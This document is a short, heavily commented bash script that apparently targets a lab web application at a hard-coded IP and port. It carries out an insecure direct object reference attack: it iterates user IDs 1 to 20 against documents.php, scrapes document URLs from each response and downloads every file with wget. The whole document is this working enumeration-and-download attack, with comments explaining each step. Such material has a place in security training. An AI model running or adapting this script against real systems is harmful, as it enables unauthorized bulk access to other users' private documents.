#!/bin/bash

# Set the base URL for the target web application
base="http://83.136.249.246:54082"

# Loop through user IDs from 1 to 20
for uid in {1..20}; do
  echo "[*] Checking uid=$uid"  # Inform which UID is being checked

  # Send a POST request with the current UID to documents.php
  # -s: silent mode (no progress bar/output)
  # -X POST: use POST request
  # -d: send POST data ("uid=$uid")
  curl -s -X POST "$base/documents.php" -d "uid=$uid" |

    # Use grep to extract all document URLs from the response HTML
    # -o: print only the matched part of the line
    # -P: use Perl regex
    # "/documents/[^']+" matches URLs starting with /documents/ until a single quote
    grep -oP "/documents/[^']+" |

    # For each URL found in the response:
    while read url; do
      echo "  [+] Downloading $url"  # Show which file is being downloaded

      # Download the document using wget
      # -q: quiet mode (no output unless there's an error)
      wget -q "$base${url}"
    done

done

# End of script.
# This script automates:
# - Sending POST requests to enumerate documents for UIDs 1 to 20
# - Extracting document file URLs from the HTML response
# - Downloading each document found using wget
